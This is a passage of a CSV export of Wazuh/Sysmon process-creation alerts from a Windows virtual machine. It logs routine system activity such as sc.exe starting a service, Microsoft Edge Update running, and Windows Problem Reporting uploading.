MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.862"",""processGuid"":""{154c2aaf-ea36-6846-2b01-000000001800}"",""processId"":""3028"",""image"":""C:\\\\Windows\\\\System32\\\\sc.exe"",""fileVersion"":""10.0.19041.1 (WinBuild.160101.0800)"",""description"":""Service Control Manager Configuration Tool"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""sc.exe"",""commandLine"":""\\\""C:\\\\Windows\\\\system32\\\\sc.exe\\\"" start pushtoinstall registration"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.330",EventChannel,1749477944.1037817,"Jun 9, 2025 @ 19:35:44.330", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,cOADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,msedgeupdate.dll,C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe,Microsoft Edge Update,{154c2aaf-ea36-6846-2301-000000001800},Microsoft Edge Update,{154c2aaf-e981-6846-e703-000000000000},"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /c",{154c2aaf-ea36-6846-2f01-000000001800},0x3e7,2296,3384,C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.61\\,2025-06-09 14:05:42.959,"MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17",C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe,Microsoft Corporation,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource core",System,1.3.147.37,NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.959
ProcessGuid: {154c2aaf-ea36-6846-2f01-000000001800}
ProcessId: 3384
Image: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
FileVersion: 1.3.147.37
Description: Microsoft Edge Update
Product: Microsoft Edge Update
Company: Microsoft Corporation
OriginalFileName: msedgeupdate.dll
CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ua /installsource core
CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.195.61\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17
ParentProcessGuid: {154c2aaf-ea36-6846-2301-000000001800}
ParentProcessId: 2296
ParentImage: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /c
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.9615036Z,30727,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,13,false,5,Sysmon - Event 1: Process creation Microsoft Edge Update,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.9615036Z"",""eventRecordID"":""30727"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.959\r\nProcessGuid: {154c2aaf-ea36-6846-2f01-000000001800}\r\nProcessId: 3384\r\nImage: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\r\nFileVersion: 1.3.147.37\r\nDescription: Microsoft Edge Update\r\nProduct: Microsoft Edge Update\r\nCompany: Microsoft Corporation\r\nOriginalFileName: msedgeupdate.dll\r\nCommandLine: \""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource core\r\nCurrentDirectory: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.61\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17\r\nParentProcessGuid: {154c2aaf-ea36-6846-2301-000000001800}\r\nParentProcessId: 2296\r\nParentImage: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\r\nParentCommandLine: \""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /c\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.959"",""processGuid"":""{154c2aaf-ea36-6846-2f01-000000001800}"",""processId"":""3384"",""image"":""C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe"",""fileVersion"":""1.3.147.37"",""description"":""Microsoft Edge Update"",""product"":""Microsoft Edge Update"",""company"":""Microsoft Corporation"",""originalFileName"":""msedgeupdate.dll"",""commandLine"":""\\\""C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe\\\"" /ua /installsource core"",""currentDirectory"":""C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\1.3.195.61\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17"",""parentProcessGuid"":""{154c2aaf-ea36-6846-2301-000000001800}"",""parentProcessId"":""2296"",""parentImage"":""C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe"",""parentCommandLine"":""\\\""C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe\\\"" /c"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.361",EventChannel,1749477944.1049216,"Jun 9, 2025 @ 19:35:44.361", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,dOADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,WerMgr,C:\\Windows\\System32\\wermgr.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Windows Problem Reporting,{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea37-6846-3701-000000001800},0x3e7,1168,1864,C:\\Windows\\system32\\,2025-06-09 14:05:43.822,"MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""C:\\Windows\\system32\\wermgr.exe\"" -upload",System,10.0.19041.5794 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:43.822
ProcessGuid: {154c2aaf-ea37-6846-3701-000000001800}
ProcessId: 1864
Image: C:\Windows\System32\wermgr.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows Problem Reporting
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WerMgr
CommandLine: ""C:\Windows\system32\wermgr.exe"" -upload
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:43.8247563Z,30731,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,17,false,5,Sysmon - Event 1: Process creation Windows Problem Reporting,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:43.8247563Z"",""eventRecordID"":""30731"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:43.822\r\nProcessGuid: {154c2aaf-ea37-6846-3701-000000001800}\r\nProcessId: 1864\r\nImage: C:\\Windows\\System32\\wermgr.exe\r\nFileVersion: 10.0.19041.5794 (WinBuild.160101.0800)\r\nDescription: Windows Problem Reporting\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WerMgr\r\nCommandLine: \""C:\\Windows\\system32\\wermgr.exe\"" -upload\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:43.822"",""processGuid"":""{154c2aaf-ea37-6846-3701-000000001800}"",""processId"":""1864"",""image"":""C:\\\\Windows\\\\System32\\\\wermgr.exe"",""fileVersion"":""10.0.19041.5794 (WinBuild.160101.0800)"",""description"":""Windows Problem Reporting"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""WerMgr"",""commandLine"":""\\\""C:\\\\Windows\\\\system32\\\\wermgr.exe\\\"" -upload"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.423",EventChannel,1749477944.1074421,"Jun 9, 2025 @ 19:35:44.423", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
